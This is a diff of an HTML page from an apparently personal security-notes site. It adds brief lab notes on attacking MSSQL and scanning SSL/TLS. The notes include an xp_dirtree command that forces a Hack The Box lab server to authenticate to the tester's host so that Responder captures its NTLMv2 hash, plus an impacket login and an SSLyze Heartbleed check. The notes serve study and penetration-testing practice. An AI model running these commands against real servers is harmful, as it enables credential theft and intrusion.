@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Misc_Service_Attack/Misc_Services.html">Misc Service Attack</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Misc_Service_Attack/Misc_Services.html">Misc Services</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 12:29 AM        </span>
+            February 16, 2021 at 12:32 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/040_Misc_Service_Attack/010_Misc_Services.md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,54 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_Misc_Services_Enumeration_Attack">Misc Services Enumeration &amp; Attack</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_Misc_Services_Enumeration_Attack">Misc Services Enumeration &amp; Attack</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Recon</code> <code>MSSQL</code> <code>SSL</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_MSSQL">MSSQL</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Get_NTLMv2_SSP_Hash">Get NTLMv2-SSP Hash</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_SSLTLS">SSL/TLS</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_SSLyze">SSLyze</a></p>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>Recon</code> <code>MSSQL</code> <code>SSL</code></h6>
+<h1 id="page_MSSQL">MSSQL</h1>
+<p>Use impacket python script as client</p>
+<pre><code>python3 mssqlclient.py reporting@10.10.10.125 -windows-auth
+</code></pre>
+<h3 id="page_Get_NTLMv2_SSP_Hash">Get NTLMv2-SSP Hash</h3>
+<pre><code>SQL&gt; xp_dirtree &quot;\\10.10.14.42\WildfootW\&quot;
+</code></pre>
+<p>Then we can get Hash in <code>Responder</code>
+<img src="https://i.imgur.com/I0Vb4mW.png" alt="" /></p>
+<h1 id="page_SSLTLS">SSL/TLS</h1>
+<h3 id="page_SSLyze">SSLyze</h3>
+<p><a href="https://github.com/nabla-c0d3/sslyze" class="Link--external" rel="noopener noreferrer">GitHub</a>
+SSL/TLS server scanning</p>
+<pre><code>sslyze --heartbleed valentine.htb
+</code></pre>
+    </div>
 
         <nav>
         <ul class="Pager">
